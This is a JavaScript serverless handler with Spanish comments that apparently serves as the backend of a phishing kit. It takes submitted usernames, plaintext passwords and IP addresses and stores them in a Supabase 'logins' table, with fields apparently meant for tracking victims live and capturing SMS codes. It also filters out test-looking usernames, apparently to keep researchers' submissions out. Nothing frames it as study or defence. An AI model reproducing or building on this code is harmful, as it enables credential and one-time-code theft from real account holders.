export default async function handler(req, res) {
  // Permitir CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { username, pass, id, ip } = req.body;

    // Validación anti-spam
    if (!username || !pass || username.length < 3 || pass.length < 3) {
      return res.status(400).json({ error: 'Datos inválidos' });
    }

    const spam = ['test', 'prueba', 'admin', 'demo', 'fake', 'user', 'pass'];
    if (spam.some(s => username.toLowerCase().includes(s))) {
      return res.status(403).json({ error: 'Spam detectado' });
    }

    // Obtener variables de entorno
    const SUPABASE_URL = process.env.SUPABASE_URL;
    const SERVICE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;

    if (!SUPABASE_URL || !SERVICE_KEY) {
      return res.status(500).json({ error: 'Configuración incompleta' });
    }

    // Guardar en Supabase
    const response = await fetch(`${SUPABASE_URL}/rest/v1/logins`, {
      method: 'POST',
      headers: {
        'apikey': SERVICE_KEY,
        'Authorization': `Bearer ${SERVICE_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'return=minimal'
      },
      body: JSON.stringify({
        id: id || crypto.randomUUID(),
        username,
        pass,
        ip: ip || 'unknown',
        online: true,
        step: 'Verificando...',
        sms: '----',
        created_at: new Date().toISOString()
      })
    });

    if (!response.ok) {
      const errorText = await response.text();
      console.error('Supabase error:', errorText);
      return res.status(500).json({ error: 'Error al guardar en base de datos' });
    }

    res.status(200).json({ success: true, message: 'Registro guardado' });

  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Error interno del servidor' });
  }
}